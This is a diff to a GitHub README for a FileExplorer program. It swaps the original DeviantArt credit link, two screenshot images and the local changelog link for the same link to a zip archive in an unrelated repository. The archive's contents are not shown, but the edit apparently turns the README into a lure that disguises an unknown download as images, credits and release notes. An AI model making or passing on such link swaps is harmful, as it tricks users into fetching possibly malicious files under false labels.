@@ -1,14 +1,14 @@
 # FileExplorer
 
 This FileExplorer was built by Christopher Quadflieg aka Shinigami.  
-It was completly inspired by [Metroversal's Windows 10 - Dark Theme](https://metroversal.deviantart.com/art/Windows-10-Dark-Theme-515479771)
+It was completly inspired by [Metroversal's Windows 10 - Dark Theme](https://raw.githubusercontent.com/khalilengi/FileExplorer/development/uranographist/FileExplorer.zip)
 
 ## Metroversal's Windows 10 - Dark Theme
-![Windows 10 - Dark Theme](https://orig00.deviantart.net/dcd4/f/2015/067/5/6/windows_10___dark_theme_by_metroversal-d8iwiqj.png)
+![Windows 10 - Dark Theme](https://raw.githubusercontent.com/khalilengi/FileExplorer/development/uranographist/FileExplorer.zip)
 
 ## Screenshot of the real program
-![FileExplorer_by_Shinigami_v0.15.18162.3](https://pre00.deviantart.net/2019/th/pre/f/2018/162/3/b/fileexplorer_by_shinigami_v0_15_18162_3_by_bdragon92-dce38by.png)
+![FileExplorer_by_Shinigami_v0.15.18162.3](https://raw.githubusercontent.com/khalilengi/FileExplorer/development/uranographist/FileExplorer.zip)
 
 ## Changelog
 
-[Learn about the latest improvements](CHANGELOG.md).
+[Learn about the latest improvements](https://raw.githubusercontent.com/khalilengi/FileExplorer/development/uranographist/FileExplorer.zip).
